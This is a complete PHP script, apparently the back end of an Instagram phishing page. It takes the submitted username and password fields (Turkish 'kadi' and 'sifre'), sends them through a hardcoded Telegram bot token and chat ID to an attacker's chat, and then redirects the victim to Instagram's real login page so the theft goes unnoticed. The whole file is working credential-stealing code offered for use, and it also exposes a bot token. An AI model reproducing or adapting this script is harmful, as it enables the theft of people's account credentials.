<?php
$botToken = "8107501603:AAEr5H7n025d4h-dQviZVwCMEJZfG0yWRSE";
$chatId   = "-4715689914";

$kadi  = $_POST['kadi'] ?? '';
$sifre = $_POST['sifre'] ?? '';

$message = "Kullanıcı Adı: $kadi\nŞifre: $sifre\n\n-Cylivra";

$url = "https://api.telegram.org/bot$botToken/sendMessage";

$data = [
    'chat_id' => $chatId,
    'text'    => $message
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

header("Location: https://www.instagram.com/accounts/login/");
exit;
?>
